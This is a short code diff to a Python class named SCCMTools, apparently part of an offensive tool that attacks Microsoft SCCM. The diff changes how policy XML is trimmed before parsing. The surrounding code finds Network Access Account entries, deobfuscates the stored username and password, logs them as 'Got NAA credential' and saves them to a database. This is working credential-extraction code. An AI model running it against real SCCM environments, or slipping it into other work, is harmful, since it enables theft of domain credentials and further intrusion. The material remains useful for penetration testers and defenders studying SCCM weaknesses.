@@ -335,16 +335,18 @@ class SCCMTools():
     def parse_xml(self, xml_file):
         try:
             #might need to update this if the weird extra character isn't consistent from the file write
-            if xml_file.endswith("Ȃ"):
-                xml_file = xml_file[:-len("Ȃ")]
-                i = ET.fromstring(xml_file)
-                for instance in i.findall(".//instance[@class='CCM_NetworkAccessAccount']"):
-                    network_access_username = instance.find(".//property[@name='NetworkAccessUsername']/value").text
-                    network_access_password = instance.find(".//property[@name='NetworkAccessPassword']/value").text
-                    clear_user = self.deobfuscate_policysecret(network_access_username).decode('utf-16-le')
-                    clear_pass = self.deobfuscate_policysecret(network_access_password).decode('utf-16-le')
-                    logger.info("[+] Got NAA credential: " + clear_user + ":" + clear_pass)
-                    self.write_to_db(clear_user, clear_pass)
+
+            index = xml_file.find("</Policy>")
+            if index != -1:
+                clean = xml_file[:index + len("</Policy>")]
+            i = ET.fromstring(clean)
+            for instance in i.findall(".//instance[@class='CCM_NetworkAccessAccount']"):
+                network_access_username = instance.find(".//property[@name='NetworkAccessUsername']/value").text
+                network_access_password = instance.find(".//property[@name='NetworkAccessPassword']/value").text
+                clear_user = self.deobfuscate_policysecret(network_access_username).decode('utf-16-le')
+                clear_pass = self.deobfuscate_policysecret(network_access_password).decode('utf-16-le')
+                logger.info("[+] Got NAA credential: " + clear_user + ":" + clear_pass)
+                self.write_to_db(clear_user, clear_pass)
             #Tools.write_to_csv(cred_dict, self.logs_dir)
 
         except ET.ParseError as e:
